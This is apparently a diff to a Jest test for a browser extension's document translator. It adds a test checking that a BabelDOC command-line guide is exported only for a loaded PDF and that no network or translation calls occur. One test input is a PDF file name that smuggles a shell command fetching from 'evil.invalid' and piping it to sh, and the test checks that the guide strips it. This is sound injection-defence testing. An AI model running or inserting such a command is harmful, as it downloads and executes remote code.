@@ -129,6 +129,7 @@ const setupDocumentDom = (): void => {
     <button id="exportPdfFile" disabled></button>
     <button id="exportTextFile" disabled></button>
     <button id="exportResearchNote" disabled></button>
+    <button id="exportBabelDocGuide" hidden disabled></button>
     <button id="clearDocument"></button>
     <textarea id="sourceText"></textarea>
     <p id="documentMessage"></p>
@@ -291,6 +292,152 @@ describe('document translator page', () => {
       expect(revokeObjectURL).toHaveBeenCalledWith('blob:research-note');
     } finally {
       clickSpy.mockRestore();
+    }
+  });
+
+  it('exports a bounded BabelDOC local guide only for an explicitly loaded PDF', async () => {
+    const session = {
+      analyze: jest.fn(async () => ({
+        blocks: [{
+          id: 1,
+          originalText: 'Local BabelDOC workflow source',
+          layout: {
+            pageNumber: 1,
+            x: 40,
+            y: 60,
+            width: 220,
+            height: 18,
+            pageWidth: 500,
+            pageHeight: 700,
+            contentKind: 'prose',
+            readingOrder: 0,
+            columnIndex: 1,
+            columnCount: 1,
+            regionX: 20,
+            regionWidth: 460,
+            source: 'pdf-text'
+          }
+        }],
+        pages: [{
+          pageNumber: 1,
+          width: 500,
+          height: 700,
+          blockCount: 1,
+          formulaBlockCount: 0,
+          columnCount: 1,
+          source: 'text'
+        }],
+        ocrPageCount: 0,
+        bundledOcrPageCount: 0,
+        unreadablePageCount: 0,
+        formulaBlockCount: 0,
+        multiColumnPageCount: 0
+      })),
+      renderPage: jest.fn(async () => ({
+        pageNumber: 1,
+        width: 500,
+        height: 700,
+        scale: 1
+      })),
+      exportTranslatedPdf: jest.fn(),
+      destroy: jest.fn(async () => undefined)
+    };
+    jest.doMock('../../services/PdfDocumentService', () => ({
+      pdfDocumentService: { open: jest.fn(async () => session) }
+    }));
+
+    let exportedBlob: Blob | null = null;
+    const createObjectURL = jest.fn((blob: Blob) => {
+      exportedBlob = blob;
+      return 'blob:babeldoc-guide';
+    });
+    const revokeObjectURL = jest.fn();
+    const clickSpy = jest.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => undefined);
+    const originalFetch = global.fetch;
+    const fetchSpy = jest.fn();
+    Object.defineProperty(global, 'fetch', { value: fetchSpy, configurable: true });
+    Object.defineProperty(URL, 'createObjectURL', { value: createObjectURL, configurable: true });
+    Object.defineProperty(URL, 'revokeObjectURL', { value: revokeObjectURL, configurable: true });
+
+    try {
+      require('../document');
+      document.dispatchEvent(new Event('DOMContentLoaded'));
+      await flushPromises();
+
+      const exportButton = document.getElementById('exportBabelDocGuide') as HTMLButtonElement;
+      const fileInput = document.getElementById('documentFile') as HTMLInputElement;
+      const sendMessage = (global as any).chrome.runtime.sendMessage as jest.Mock;
+      expect(exportButton.hidden).toBe(true);
+      expect(exportButton.disabled).toBe(true);
+      expect(createObjectURL).not.toHaveBeenCalled();
+      expect(fetchSpy).not.toHaveBeenCalled();
+      expect(sendMessage).not.toHaveBeenCalledWith(
+        expect.objectContaining({ action: 'translate' }),
+        expect.any(Function)
+      );
+
+      const pdf = new File(
+        ['pdf bytes'],
+        "draft'; $(Invoke-WebRequest https://evil.invalid) | sh #.pdf",
+        { type: 'application/pdf' }
+      );
+      Object.defineProperty(pdf, 'arrayBuffer', {
+        value: async () => new Uint8Array([1, 2, 3]).buffer,
+        configurable: true
+      });
+      Object.defineProperty(fileInput, 'files', { value: [pdf], configurable: true });
+      fileInput.dispatchEvent(new Event('change'));
+      await flushPromises();
+      await flushPromises();
+
+      expect(exportButton.hidden).toBe(false);
+      expect(exportButton.disabled).toBe(false);
+      expect(createObjectURL).not.toHaveBeenCalled();
+      expect(fetchSpy).not.toHaveBeenCalled();
+      expect(sendMessage.mock.calls.map(call => call[0].action)).not.toContain('translate');
+
+      const targetLanguage = document.getElementById('targetLanguage') as HTMLSelectElement;
+      targetLanguage.value = 'zh-TW';
+      exportButton.dispatchEvent(new Event('click'));
+
+      expect(createObjectURL).toHaveBeenCalledTimes(1);
+      expect(exportedBlob).not.toBeNull();
+      const guide = await readBlobText(exportedBlob!);
+      expect(guide).toContain("babeldoc --files 'C:\\ABSOLUTE\\PATH\\");
+      expect(guide).toContain("--lang-in 'en' --lang-out 'zh-TW'");
+      expect(guide).toContain("babeldoc --files '/absolute/path/");
+      expect(guide).toContain('does not claim or enable automatic language detection');
+      expect(guide).not.toContain('Invoke-WebRequest');
+      expect(guide).not.toContain('evil.invalid');
+      expect(guide).not.toMatch(/api[-_ ]?key/iu);
+      expect((clickSpy.mock.contexts[0] as HTMLAnchorElement).download)
+        .toMatch(/^[\p{L}\p{N}._ ()-]+\.babeldoc-guide\.md$/u);
+      expect(revokeObjectURL).toHaveBeenCalledWith('blob:babeldoc-guide');
+
+      document.getElementById('clearDocument')!.dispatchEvent(new Event('click'));
+      await flushPromises();
+      expect(exportButton.hidden).toBe(true);
+      expect(exportButton.disabled).toBe(true);
+      exportButton.dispatchEvent(new Event('click'));
+      expect(createObjectURL).toHaveBeenCalledTimes(1);
+
+      const textFile = new File(['plain text'], 'notes.txt', { type: 'text/plain' });
+      Object.defineProperty(textFile, 'text', {
+        value: async () => 'plain text',
+        configurable: true
+      });
+      Object.defineProperty(fileInput, 'files', { value: [textFile], configurable: true });
+      fileInput.dispatchEvent(new Event('change'));
+      await flushPromises();
+      await flushPromises();
+      expect(exportButton.hidden).toBe(true);
+      expect(exportButton.disabled).toBe(true);
+      expect(createObjectURL).toHaveBeenCalledTimes(1);
+      expect(fetchSpy).not.toHaveBeenCalled();
+      expect(sendMessage.mock.calls.map(call => call[0].action)).not.toContain('translate');
+    } finally {
+      clickSpy.mockRestore();
+      Object.defineProperty(global, 'fetch', { value: originalFetch, configurable: true });
     }
   });
 
